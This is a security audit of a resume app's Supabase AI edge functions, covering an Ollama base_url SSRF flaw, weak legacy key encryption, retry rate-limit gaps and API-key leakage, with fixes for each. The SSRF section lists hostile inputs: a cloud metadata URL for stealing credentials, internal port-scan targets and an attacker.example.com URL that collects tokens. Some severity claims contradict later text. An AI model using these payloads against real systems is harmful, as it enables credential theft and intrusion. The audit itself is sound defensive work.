# AI Tools Security Audit — supabase/functions/_shared + AI edge functions

**Scope:** `supabase/functions/_shared/aiClient.ts` (2252 LOC), `creditUtils.ts`,
`userRateLimiter.ts`, `planLimits.ts`, `manage-api-keys/index.ts`, plus the
38 AI edge functions that consume them (analyze-resume, wise-ai-chat,
agentic-chat, enhance-section, parse-resume, parse-job-url, parse-linkedin,
parse-job-text, optimize-for-linkedin, one-page-optimizer, interview-chat,
generate-portfolio-bio, etc.).

**Date:** 2026-04-21
**Reviewer:** Replit security pass (post AUTH_AUDIT)
**Status of complementary audits:** `DATABASE_AUDIT.md`, `AUTH_AUDIT.md`

---

## TL;DR — severity inventory

| # | Severity | Finding | Tracked task |
|---|----------|---------|--------------|
| 1 | **P0 / Critical** | Ollama BYOK `base_url` accepted with **zero validation** → SSRF / metadata exfil / internal-service probe primitive. | `ai-byok-ollama-ssrf` |
| 2 | **P0 / Critical** | Legacy v1 API keys still decryptable with master secret alone (static salt `user-api-keys-salt`); `key_version` field is service-role-mutable and silently downgrades the salt on read. | `ai-key-encryption-v2-migration` |
| 3 | **P1 / High** | `parseAIJSONWithRetry` makes a second `callAI` round-trip that re-runs through the owning edge function's already-deducted credit (or, in some functions, deducts a second credit) and is uncounted by `userRateLimiter`. | `ai-parseretry-credit-safety` |
| 4 | **P1 / High** | `BYOK_PROVIDER_ALLOWLIST` (creditUtils), `OPENROUTER_CURATED_MODELS` (3 copies), `OPENAI_COMPAT_BASE_URLS`, and the BYOK routing branches in `callAI` are duplicated; comments admit "keep these three lists in lockstep". A drift gives free credits or charges BYOK users. | `ai-config-deduplication` |
| 5 | **P1 / High** | Gemini key transmitted as `?key=…` URL query param → leaks into `TypeError`/`AbortError` `.message`, `console.error`, and the `toUserError` diag string returned to the client. Also: no scrub of upstream error bodies that may echo the prompt or key. Combined with the broad `*.replit.dev` CORS wildcard in `_shared/cors.ts:22`, the leak surface is real. | `ai-error-leak-hardening` |
| 6 | **P2 / Medium** | `userRateLimiter` and `isBreakerOpen` both **fail-OPEN** on infra error; combined, two layers can silently disable abuse-prevention. The fail-open is deliberate and documented but lacks any operator-visible health signal. | folded into `ai-error-leak-hardening` |
| 7 | **P2 / Medium** | `getOpenRouterAdminSettings` fails open to `OPENROUTER_CURATED_MODELS[0]` on any DB error, silently overriding the admin's deliberate model selection. Stale-cache fallback is safer. | folded into `ai-error-leak-hardening` |
| 8 | **P2 / Medium** | `manage-api-keys` has no origin/CSRF defence — relies on JWT only. With the `*.replit.dev` wildcard in `_shared/cors.ts`, any Replit-hosted preview app can be coaxed (via a logged-in user's browser) into invoking key-rotation endpoints with the user's JWT. The AUTH_AUDIT `*.lovable.app` issue is a *redirect-URI allow-list* concern (AUTH_AUDIT C5), not a CORS one — keep the two distinct. | folded into `ai-config-deduplication` (CORS allowlist tightening) |
| 9 | **P3 / Low** | `parseOpenAIResponse` / `parseVertexResponse` use `any`; malformed upstream JSON can yield `content: undefined`. | code-quality, not tracked separately |
| 10 | **P3 / Low** | `refundCredit` no-ops on `effectivePlan === 'premium'`; if a trial flips between deduct and refund the user can be over-charged by 1. | folded into `ai-parseretry-credit-safety` |

---

## 1. Critical — Ollama BYOK SSRF (`callOllamaDirect`)

**Files:** `aiClient.ts:993-1078`, `manage-api-keys/index.ts:187-195`

`manage-api-keys` accepts an arbitrary `baseUrl` for `provider === 'ollama'`
and stores it via `normalizeOptionalString` only:

```ts
if (provider === 'ollama') {
  const resolvedBaseUrl = baseUrl || base_url;
  upsertData.base_url = normalizeOptionalString(resolvedBaseUrl); // <-- no URL parse, no host check
  upsertData.model = normalizedModel;
}
```

Every AI edge function then resolves that URL through `getUserKeyAndUrlFromDB`
and the BYOK Ollama branch fires the request server-side from the Supabase
edge runtime:

```ts
// aiClient.ts, BYOK Ollama branch
const res = await callOllamaDirect(
  userOllamaData.key,        // Bearer token sent on outbound request
  userOllamaData.baseUrl,    // <-- attacker-controlled
  ollamaModel, messages, …);
```

`callOllamaDirect` does only a trailing-slash trim and a regex check for
`ollama.com` to decide native-vs-OpenAI-compat formatting; **no scheme,
host, or IP validation** is performed before `fetch(endpoint, …)`.

### Exploit primitives

| Attacker base_url | Effect |
|---|---|
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Cloud metadata exfil from inside the edge runtime; response body is wrapped into the JSON parse error message and returned to the user via `toUserError` diag. |
| `http://10.0.0.5:5432` / `http://internal-supavisor:6543` | Internal port-scan and service fingerprinting. Status codes + first 200 chars of body leak via `toUserError`. |
| `http://attacker.example.com/log?t=` + Authorization Bearer | Exfiltrates *another* attacker's Ollama key (or any string the user typed thinking it was a key) to attacker logs. |
| `file://` / `gopher://` / `ftp://` (depends on Deno fetch policy) | Some runtimes accept; needs verification. |
| DNS rebinding `attacker.com → 127.0.0.1` between save-time validation and request-time fetch | Defeats naïve `URL.parse` checks — must resolve and pin the IP. |

### Required fix (see `ai-byok-ollama-ssrf` task plan)

1. **Validate at write-time** (`manage-api-keys`):
   - Reject anything that does not parse as a URL.
   - Allow scheme `https:` only — *or* `http:` only when host is exactly
     `localhost` / `127.0.0.1` and a documented dev flag is set.
   - Reject any host that resolves to a private IP (10/8, 172.16/12,
     192.168/16, 127/8, 169.254/16, IPv6 ULA `fc00::/7`, link-local
     `fe80::/10`, `::1`, IPv4-mapped IPv6).
   - Reject port < 1024 except 443/80; cap URL length at 2 KB.
2. **Re-validate at read-time** (`callOllamaDirect`) so legacy rows can't
   bypass the new check.
3. **DNS-pin** the resolved IP and pass it via `URL` host override for the
   actual fetch (defeats DNS rebinding).
4. **Strip Authorization header** when the resolved host is public-cloud
   metadata-style (defence in depth).
5. Backfill: scan `user_api_keys` for `provider='ollama'` with an invalid
   base_url and null them; force re-entry.

---

## 2. Critical — v1 keys decryptable with master secret alone

**Files:** `aiClient.ts:144-180`, `manage-api-keys/index.ts:16-50`

```ts
function resolveKeySalt(keyVersion, userId) {
  if (keyVersion === 2) return `user-api-keys-salt-v2-${userId}`;
  return 'user-api-keys-salt'; // <-- v1 fallback, static salt
}
```

Two compounding problems:

1. **Threat model regression for v1 rows.** The v2 design exists precisely
   so that an `API_KEY_ENCRYPTION_SECRET` leak alone is not enough to
   decrypt any user's keys. v1 rows still in `user_api_keys` defeat that:
   leaking the secret + a database dump = every v1 user's BYOK keys are
   plaintext. There is **no migration job** that re-encrypts v1 → v2.

2. **Downgrade attack.** `user_api_keys` is service-role-writable. An
   attacker with service-role access (or a SQL-injection on a function
   that touches the table — see DATABASE_AUDIT.md) can flip
   `key_version` from 2 → 1 on a target row; on the next read,
   `resolveKeySalt` returns the static salt and decryption fails
   *silently with no audit*, OR (if the row was originally v1 and just
   re-marked) succeeds with secret-only access.

### Required fix (see `ai-key-encryption-v2-migration`)

- Write a one-shot edge function (admin-gated) that for every row with
  `key_version <> 2`: decrypts under static salt, re-encrypts with the
  per-user salt, sets `key_version = 2`, updates `updated_at`. Emits a
  per-row audit log row (no key material).
- Gate the read path on `key_version = 2`; reject v1 with a "please
  re-enter your key" surface error and force the user through the
  manage-api-keys UI.
- Add a CHECK constraint `key_version IN (2)` to prevent future
  downgrades.
- Plan key-rotation tooling: bumping `API_KEY_ENCRYPTION_SECRET`
  requires a new `key_version = 3` and a similar migration.

---

## 3. High — `parseAIJSONWithRetry` credit + rate-limit hole

**Files:** `aiClient.ts:2216-2251`

When the model returns malformed JSON, the helper makes a *second*
`callAI(...)` round-trip with the original `retryOptions` (which include
`userId`). The owning edge function has already:

- passed `requireAuth` once,
- consumed one slot in `checkUserRateLimit(userId, 'analyze', 10, 60)`,
- and called `checkAndDeductCredit(userId, 1 or 2)`.

The retry then:

- **bypasses both rate limiters** — the second `callAI` does NOT touch
  `checkUserRateLimit`, so a malicious user that consistently induces
  malformed JSON (e.g. via prompt injection in resume content) can double
  their effective rate against the upstream provider.
- **does NOT double-deduct credits** — the retry path goes through `callAI`
  which does not call `checkAndDeductCredit`, and only the outer endpoint
  function debits. (Earlier draft of this audit incorrectly claimed a
  double-deduct; corrected after re-reading the call graph.)
- **counts twice against the breaker** for the same logical user request,
  inflating the threshold trip rate. Confirmed callers of
  `parseAIJSONWithRetry`: `analyze-resume`, `enhance-section`,
  `interview-chat`, `tailor-section`, `tailor-resume`. Each gets up to 2x
  upstream calls per user-visible action without any matching uplift in
  the per-feature window.

### Required fix (see `ai-parseretry-credit-safety`)

- Note that `callAI` itself does NOT invoke `checkUserRateLimit` /
  `checkAndDeductCredit` — those live in each endpoint. So the retry's
  exposure is solely against the **breaker** (counted twice) and against
  upstream provider rate limits (also counted twice). Targeted fix:
- Have `parseAIJSONWithRetry` short-circuit its second `callAI` so the
  per-request **breaker cache** built up by the parent `callAI` is
  re-used (no second `isBreakerOpen` round-trip), and so the outcome of
  the retry is not double-counted as an independent failure event.
  Practical shape: pass a `_retry: { breakerCache }` flag into a
  not-publicly-exported `callAIInternal`, or refactor so retry is a
  loop **inside** `callAI` (preferred — wraps both attempts in one
  budget/breaker decision).
- Audit `refundCredit` semantics on premium plans (see #10 below) at the
  same time — a trial-expiry race can over-charge by 1. That fix lives
  in `creditUtils.refundCredit` (capture-and-use `effectivePlan` from
  the original `CreditCheckResult`), not in `callAI`.

---

## 4. High — config drift between BYOK allow-list, OpenRouter curated list, and routing branches

**Files (duplicated lists):**

- `supabase/functions/_shared/creditUtils.ts:9-19` (`BYOK_PROVIDER_ALLOWLIST`)
- `supabase/functions/_shared/aiClient.ts:1144-1150` (`OPENAI_COMPAT_BASE_URLS`)
- `supabase/functions/_shared/aiClient.ts:478` (the `if (preferredProvider && (OPENAI_COMPAT_BASE_URLS[…] || preferredProvider === 'anthropic'))` branch)
- `supabase/functions/manage-api-keys/index.ts:67-77` (`OPENROUTER_CURATED_MODELS`)
- `supabase/functions/_shared/aiClient.ts` (same constant, separate copy)
- `src/lib/aiDefaults.ts` (third copy — front-end)
- `creditUtils.ts` even has the in-line comment: *"BYOK provider allowlist —
  must stay in sync with callAI in aiClient.ts."*

### Why it bites

- **Free-credit grant on drift**: if a future provider is added to
  `BYOK_PROVIDER_ALLOWLIST` before the routing branch in `callAI`,
  `checkAndDeductCredit` returns `isByok: true` (no debit) but the actual
  call falls through to managed keys → **the user just got a free
  managed AI call**.
- **Charge-on-BYOK**: reverse drift double-charges BYOK users.
- **Curated model bypass**: front-end and `manage-api-keys` enforce the
  curated list at write; `aiClient` enforces it at execution. If only
  one of the three lists is updated, an off-list slug is either rejected
  by the writer (UX bug) or executed against OpenRouter despite not being
  in the contract (cost / billing risk).

### Required fix (see `ai-config-deduplication`)

- Move `BYOK_PROVIDER_ALLOWLIST`, `OPENAI_COMPAT_BASE_URLS`, and
  `OPENROUTER_CURATED_MODELS` into a single
  `supabase/functions/_shared/aiProviders.json` (mirroring the
  `creditLimits.json` pattern).
- Re-export typed constants from `_shared/aiProviders.ts` and consume
  them in `creditUtils`, `aiClient`, `manage-api-keys`, and
  `src/lib/aiDefaults.ts` (via a small build-time copy or a shared
  TS module).
- Add a Vitest that asserts: every key in `BYOK_PROVIDER_ALLOWLIST` is
  routed by `callAI` (parameterised), and every entry in
  `OPENROUTER_CURATED_MODELS` is recognised by `isAllowedOpenRouterModel`.
- Tighten CORS allow-list at the same time (drop `*.lovable.app`
  wildcard) so the rotation-via-CSRF surface from finding #8 closes.

---

## 5. High — Gemini key leakage and prompt/error log hygiene

**Files:** `aiClient.ts:1941` (key in URL), `aiClient.ts:2108-2132`
(`toUserError` diag), every `callXxxDirect` `console.error('… API error:',
status, errorText)`.

```ts
const url = `https://generativelanguage.googleapis.com/v1beta/models/${geminiModel}:generateContent?key=${apiKey}`;
console.log(`[AI] Calling Gemini API: ${url.split('?')[0]} …`); // safe
const response = await fetch(url, …);                            // url contains key
```

Three leak vectors:

1. A `TypeError: Failed to fetch` (DNS, TLS, network) constructed by Deno
   often includes the full URL. That `Error.message` propagates to
   `toUserError`, which does `msg = (error.message || '').slice(0, 200)`
   and **returns it to the client** as the `message` field of the JSON
   response (`Something went wrong: TypeError: …?key=AIza…`).
2. `console.error('Gemini upstream error', status, errorText)` puts the
   request URL into stderr when the upstream returns an HTTP error with
   the URL echoed back (some Google error envelopes do).
3. `errorText` from any provider may contain prompt content the upstream
   echoes back ("invalid input: <first 1KB of resume JSON>"). Combined
   with the policy of returning the upstream `errorMessage` verbatim in
   `createAIError(... errorMessage, status)`, parts of user prompts can
   round-trip into the client's error toast, which any other tab on the
   same browser session can read.

### Required fix (see `ai-error-leak-hardening`)

- Switch Gemini to header auth: `'x-goog-api-key': apiKey` (supported by
  generativelanguage.googleapis.com); remove the key from the URL. This
  also removes the key from `console.log` URL prints.
- Add a redactor utility `scrubSecrets(s: string): string` that strips
  `key=…`, `Bearer …`, `sk-…`, `ai-…`, etc. before any `console.error`
  or any string returned by `toUserError`.
- Cap upstream `errorText` echoes to ~100 chars and pass through the
  redactor before forwarding into `createAIError`.
- For `userRateLimiter` and `isBreakerOpen` fail-OPEN events, emit a
  structured log line `{ event: 'rate_limiter_fail_open', ts, feature }`
  and increment a `wiseresume.rate_limiter.fail_open.count` row in
  `app_settings` (or a new `ops_health` table) so on-call can alert.
- For `getOpenRouterAdminSettings` DB-error path, prefer the last
  successfully-cached value over the hardcoded default. Only fall back
  to `OPENROUTER_CURATED_MODELS[0]` if there has never been a successful
  read since cold start.

---

## Findings 6–10 — folded into the above tasks

- **6 / 7 / Health signals**: covered in `ai-error-leak-hardening`.
- **8 / CSRF on key rotation**: covered in `ai-config-deduplication`
  (CORS allow-list tightening) plus the AUTH_AUDIT-1 / `auth-config-tightening`
  task.
- **9 / `any` typing in response parsers**: low-priority code-quality
  cleanup, no separate task.
- **10 / Refund vs trial-expiry race**: included in the
  `ai-parseretry-credit-safety` task as a sub-fix because both touch
  `creditUtils.refundCredit`.

---

## Defence-in-depth that is working well (don't regress)

- BYOK strict mode: BYOK call failures **do not** silently fall back to
  managed keys (`aiClient.ts:523-537`). Good — keeps cost off the
  platform when the user opted in to BYOK.
- Cross-instance Postgres breaker with half-open probe semantics
  (`try_acquire_breaker_pass`) — well-designed and prevents stampede.
- `sanitizeInputText` strips non-printable chars and caps length at the
  call site for every user-supplied AI input field (resume text, JD,
  LinkedIn). Keep enforcing per-call.
- Per-user salt v2, atomic credit deduction RPC with usage-date
  threading across midnight UTC — both well-thought-out.
- `isSkippableError` cleanly separates auth/payment (don't retry) from
  rate-limit/5xx (advance to next model) — keep.

---

## Remediation tasks created

| ID | Title | Severity | Depends on |
|----|-------|----------|------------|
| ai-byok-ollama-ssrf | Validate Ollama BYOK base_url at write + read; DNS-pin; backfill | P0 | none |
| ai-key-encryption-v2-migration | Migrate v1 keys → v2; lock read path to v2; CHECK constraint | P0 | none |
| ai-parseretry-credit-safety | Internal-flag the parseAIJSONWithRetry call so it doesn't double-account; audit refundCredit on premium-trial flip | P1 | none |
| ai-config-deduplication | Single-source BYOK allowlist + OpenRouter curated list + provider URLs; tighten CORS; drift-detection test | P1 | AUTH-1 (auth-config-tightening) |
| ai-error-leak-hardening | Gemini header auth; secret-scrub utility on logs+toUserError; structured fail-open metrics; admin-cache stale-prefer | P1 | none |
